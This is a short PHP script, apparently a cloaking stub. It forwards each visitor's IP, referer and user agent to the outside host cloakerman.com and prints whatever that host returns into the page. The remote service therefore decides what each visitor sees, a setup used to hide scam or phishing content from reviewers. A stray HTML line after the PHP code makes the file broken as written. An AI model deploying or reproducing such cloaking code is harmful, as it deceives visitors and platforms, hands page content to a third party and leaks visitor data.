<?php
$url= "yas1094c";
function sayfayaBaglan($url,$ref){ 
	$ch = curl_init(); 
	$zaman = 0; 
		curl_setopt ($ch, CURLOPT_URL, "https://cloakerman.com/redirect.php?link=$url&ip=".$_SERVER["REMOTE_ADDR"]); 
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $zaman);
		curl_setopt($ch, CURLOPT_REFERER,$ref );
		curl_setopt($ch, CURLOPT_USERAGENT, getenv('HTTP_USER_AGENT'));


	$rmx = curl_exec($ch); 
		curl_close($ch); 
		return $rmx; 
}
$ref = $_SERVER['HTTP_REFERER']?$_SERVER['HTTP_REFERER']:null;
print_r(sayfayaBaglan($url,$ref));

<h1>deneme</h1>
